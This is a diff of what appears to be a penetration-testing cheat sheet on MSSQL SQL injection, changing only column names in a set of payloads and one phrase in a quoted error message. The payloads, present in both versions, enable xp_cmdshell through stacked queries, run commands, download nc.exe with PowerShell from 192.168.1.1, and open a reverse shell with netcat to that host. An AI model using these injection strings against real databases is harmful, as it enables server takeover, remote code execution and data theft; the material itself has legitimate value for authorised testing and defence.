@@ -11,17 +11,17 @@ is_srvrolemember('sysadmin')
 If it is equal to one, you can be execute xp\_cmdshell command.
 
 ```
-' UNION SELECT pass,id FROM Users; WAITFOR DELAY '0:0:5';--  - multiple queries ok.
+' UNION SELECT NULL,test,NULL FROM Users; WAITFOR DELAY '0:0:5';--  - multiple queries ok.
 
-' UNION SELECT pass,id FROM Users; EXEC xp_cmdshell "whoami";--   - nope.
+' UNION SELECT NULL,test,NULL FROM Users; EXEC xp_cmdshell "whoami";--   - nope.
 
-' UNION SELECT pass,id FROM Users; EXEC sp_configure "show advanced options", 1;RECONFIGURE;EXEC sp_configure "xp_cmdshell", 1;RECONFIGURE;--
+' UNION SELECT NULL,test,NULL FROM Users; EXEC sp_configure "show advanced options", 1;RECONFIGURE;EXEC sp_configure "xp_cmdshell", 1;RECONFIGURE;--
 
-' UNION SELECT pass,id FROM Users; EXEC master..xp_cmdshell "whoami";-- - ok.
+' UNION SELECT NULL,test,NULL FROM Users; EXEC master..xp_cmdshell "whoami";-- - ok.
 
-' UNION SELECT pass,id FROM Users; EXEC master..xp_cmdshell "powershell Invoke-WebRequest -Uri http://192.168.1.1/nc.exe -OutFile nc.exe";--  -OK
+' UNION SELECT NULL,test,NULL FROM Users; EXEC master..xp_cmdshell "powershell Invoke-WebRequest -Uri http://192.168.1.1/nc.exe -OutFile nc.exe";--  -OK
 
-' UNION SELECT pass,id FROM Users; EXEC master..xp_cmdshell "nc.exe -e cmd 192.168.1.1 80";-- -OK
+' UNION SELECT NULL,test,NULL FROM Users; EXEC master..xp_cmdshell "nc.exe -e cmd 192.168.1.1 80";-- -OK
 ```
 
 ### Getting RCE on MSSQL
@@ -48,7 +48,7 @@ SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshe
 because this component is turned off as part of the security configuration for this
 server. A system administrator can enable the use of 'xp_cmdshell' by using
 sp_configure. For more information about enabling 'xp_cmdshell', search for
-'xp_cmdshell' in SQL Server Books Online.
+'xp_cmdshell' in SQL Server Online.
 ```
 
 If the output like the above then you need to activate the cmdshell feature with below commands
